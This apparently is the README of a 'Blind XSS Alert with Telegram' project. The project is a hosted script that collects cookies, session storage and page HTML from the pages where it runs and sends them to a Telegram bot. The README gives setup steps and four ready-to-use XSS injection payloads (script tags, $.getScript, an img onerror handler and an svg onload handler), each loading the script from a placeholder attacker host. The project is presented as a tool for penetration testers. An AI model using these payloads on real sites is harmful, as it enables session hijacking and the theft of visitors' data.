# 🔍 Blind XSS Alert with Telegram

## 📜 Description
This project is designed to identify Blind XSS vulnerabilities by capturing data from affected web pages and sending it to a Telegram bot. The data includes cookies, session storage, and HTML content. This tool is useful for security researchers and penetration testers looking to automate the detection of Blind XSS vulnerabilities.

## 🚀 Features
- Captures and sends cookies, and HTML content to Telegram.
- Uploads HTML content as a separate file for easier review.
- Includes payload examples for testing purposes.

### 🛠️ Hosting on GitHub Pages
1. Create a GitHub repository named `blind-xss-alert-with-telegram`.
2. Upload `script.js` and any related files
3. Push changes to GitHub.

## 🧪 Payload Examples
<script src=//yourserver.com/script.js></script>
<script>$.getScript("https://yourserver.com/script.js")</script>
<Img src="nonexistent.jpg" OnError="var script = document.createElement('script'); script.src = 'https://yourserver.com/script.js'; document.head.appendChild(script);">
<Svg Only=1 OnLoad="var script = document.createElement('script'); script.src = 'https://yourserver.com/script.js'; document.head.appendChild(script);">

